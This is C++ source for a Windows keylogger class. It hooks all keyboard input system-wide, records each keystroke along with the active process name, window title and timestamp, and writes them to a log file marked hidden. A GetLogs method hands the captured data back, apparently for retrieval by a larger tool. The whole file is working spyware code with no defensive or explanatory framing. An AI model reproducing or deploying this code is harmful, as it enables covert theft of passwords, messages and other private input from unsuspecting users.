#include "Keylogger.h"
#include "FileUtils.h"
#include "ProcUtils.h"

#include <Windows.h>
#include <iostream>
#include <string>

namespace
{
	std::ofstream logs;
	KBDLLHOOKSTRUCT kbStruct;
	HWND currWnd;
	HKL hkl = GetKeyboardLayout(GetCurrentThreadId());
	DWORD vk;

	const char frenchNums[] = "à&é\"'(-è_ç";

	std::string GetTimeString()
	{
		SYSTEMTIME sysTm;
		char buffer[32] = { 0 };

		GetSystemTime(&sysTm);
		snprintf(buffer, sizeof(buffer),
			"%02d/%02d/%02d %02d:%02d",
			sysTm.wDay, sysTm.wMonth, sysTm.wYear,
			sysTm.wHour, sysTm.wMinute);

		return std::string(buffer);
	}

	void Log(const char *data)
	{
		if (currWnd != GetForegroundWindow())
		{
			currWnd = GetForegroundWindow();
			char wndName[256]{ 0 };
			std::string procName = ProcUtils::GetProcNameByHwnd(currWnd);
			GetWindowTextA(currWnd, wndName, sizeof(wndName));
			if (::logs.tellp() > 0) logs << '\n';
			logs << "[";
			logs << (procName.empty() ? "???" : procName);
			logs << " - " << wndName << " - ";
			logs << GetTimeString() << "]\n" << std::endl;
		}
		logs << data;
	}

	void Log(const char c)
	{
		char str[2]{ c, '\0' };
		Log(str);
	}

	void HideLogs(const char *path)
	{
		HANDLE hFile;

		if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES
			&& GetLastError() == ERROR_FILE_NOT_FOUND)
		{
			hFile = CreateFileA(
				path, GENERIC_WRITE | GENERIC_READ,
				0, NULL, CREATE_ALWAYS,
				FILE_ATTRIBUTE_HIDDEN, NULL);

			if (hFile == INVALID_HANDLE_VALUE)
			{
				hFile = NULL;
			}
		}
		else
		{
			hFile = CreateFileA(
				path, FILE_APPEND_DATA,
				0, NULL, OPEN_ALWAYS,
				FILE_ATTRIBUTE_HIDDEN, NULL);
		}

		CloseHandle(hFile);
	}

	HHOOK kbHook;

	void LogRoutine(LPVOID param)
	{
		Keylogger *pKeylogger = (Keylogger*)param;
		if (pKeylogger->SetKeyboardHook())
		{
			MSG msg;
			while (GetMessage(&msg, 0, 0, 0))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	}

	LRESULT WINAPI kbHookProc(int code, WPARAM wParam, LPARAM lParam)
	{
		bool caps = (bool)(GetKeyState(VK_CAPITAL) & 1) ^ (bool)(GetKeyState(VK_SHIFT) & 0x0080);
		kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
		vk = kbStruct.vkCode;

		if (code == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
		{
			if ((vk >= 'A' && vk <= 'Z'))
				Log(caps ? (char)vk : (char)(vk + 32));
			else if ((vk >= '0' && vk <= '9'))
				Log(caps ? (char)vk : (char)(frenchNums[vk - '0']));
			else
			{
				switch (vk)
				{
				case VK_LSHIFT:		break;
				case VK_RSHIFT:		break;
				case VK_LCONTROL:	Log("[CTRL]"); break;
				case VK_RCONTROL:	Log("[CTRL]"); break;
				case VK_SPACE:		Log(" "); break;
				case VK_ESCAPE:		Log("[ESC]"); break;
				case VK_BACK:		Log("[BACK]"); break;
				case VK_RETURN:		Log("[RET]\n"); break;
				case VK_TAB:		Log("[TAB]"); break;
				case VK_LEFT:		Log("[L]"); break;
				case VK_RIGHT:		Log("[R]"); break;
				case VK_UP:		Log("[U]"); break;
				case VK_DOWN:		Log("[D]"); break;
				case VK_F1:		Log("[F1]"); break;
				case VK_F2:		Log("[F2]"); break;
				case VK_F3:		Log("[F3]"); break;
				case VK_F4:		Log("[F4]"); break;
				case VK_F5:		Log("[F5]"); break;
				case VK_F6:		Log("[F6]"); break;
				case VK_F7:		Log("[F7]"); break;
				case VK_F8:		Log("[F8]"); break;
				case VK_F9:		Log("[F9]"); break;
				case VK_F10:		Log("[F10]"); break;
				case VK_F11:		Log("[F11]"); break;
				case VK_F12:		Log("[F12]"); break;
				case VK_DELETE:		Log("[DEL]"); break;
				case VK_LWIN:		Log("[WIN]"); break;
				case VK_NUMLOCK:	Log("[NUMLOCK]"); break;
				case VK_NUMPAD0:	Log("0"); break;
				case VK_NUMPAD1:	Log("1"); break;
				case VK_NUMPAD2:	Log("2"); break;
				case VK_NUMPAD3:	Log("3"); break;
				case VK_NUMPAD4:	Log("4"); break;
				case VK_NUMPAD5:	Log("5"); break;
				case VK_NUMPAD6:	Log("6"); break;
				case VK_NUMPAD7:	Log("7"); break;
				case VK_NUMPAD8:	Log("8"); break;
				case VK_NUMPAD9:	Log("9"); break;
				case VK_ADD:		Log("+"); break;
				case VK_DIVIDE:		Log("/"); break;
				case VK_SUBTRACT:	Log("-"); break;
				case VK_MULTIPLY:	Log("*"); break;
				case VK_SNAPSHOT:	Log("[PRTSCR]"); break;
				default:
				{
					BYTE kState[256];
					GetKeyboardState(kState);
					wchar_t value;

					ToUnicodeEx(vk,
						kbStruct.scanCode, kState,
						&value, 1, NULL, hkl);

					Log((char)value);
				}
				}
			}
		}
		logs.flush();
		return CallNextHookEx(kbHook, code, wParam, lParam);
	}
}

void Keylogger::Start()
{
	::HideLogs(m_path.c_str());
	::logs.open(m_path.c_str(), std::ios::out | std::ios::app, _SH_DENYRW);
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)::LogRoutine, this, 0, 0);
}

void Keylogger::Stop() noexcept
{
	::logs << std::endl;
	TerminateThread(hThread, EXIT_SUCCESS);
	UnhookWindowsHookEx(::kbHook);
}

std::vector<byte> Keylogger::GetLogs()
{
	::logs.close();
	std::vector<byte> ret = File::GetAllBytes(m_path.c_str());
	::logs.open(m_path.c_str(), std::ios::out | std::ios::app, _SH_DENYRW);
	return ret;
}

bool Keylogger::SetKeyboardHook()
{
	::kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, ::kbHookProc, (HINSTANCE)0, 0);
	return ::kbHook != NULL;
}
